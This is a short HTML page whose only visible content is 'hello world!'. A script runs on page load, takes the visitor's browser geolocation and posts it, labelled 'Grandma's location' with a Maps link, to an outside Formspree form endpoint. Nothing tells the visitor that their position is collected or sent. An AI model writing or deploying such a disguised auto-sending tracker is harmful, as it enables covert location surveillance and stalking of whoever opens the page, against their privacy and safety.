<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Location via Email</title>
    <script>
        function sendLocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;
                        
                        const emailData = new FormData();
                        emailData.append('latitude', latitude);
                        emailData.append('longitude', longitude);
                        emailData.append('message', `Grandma's location:\nLatitude: ${latitude}, Longitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);

                        // Send the email via Formspree API
                        fetch('https://formspree.io/f/xjkvdbwg', {  // Replace {your_form_id} with your Formspree form ID
                            method: 'POST',
                            body: emailData
                        })
                        .then(response => response.json())
                        .then(() => alert('Location sent successfully!'))
                        .catch((error) => {
                            console.error('Error:', error);
                            alert('Failed to send the email.');
                        });
                    },
                    (error) => {
                        alert("Error fetching location: " + error.message);
                    }
                );
            } else {
                alert("Geolocation is not supported by your browser.");
            }
        }

        window.onload = sendLocation;
    </script>
</head>
<body>
    <h1>hello world!</h1>
    
</body>
</html>
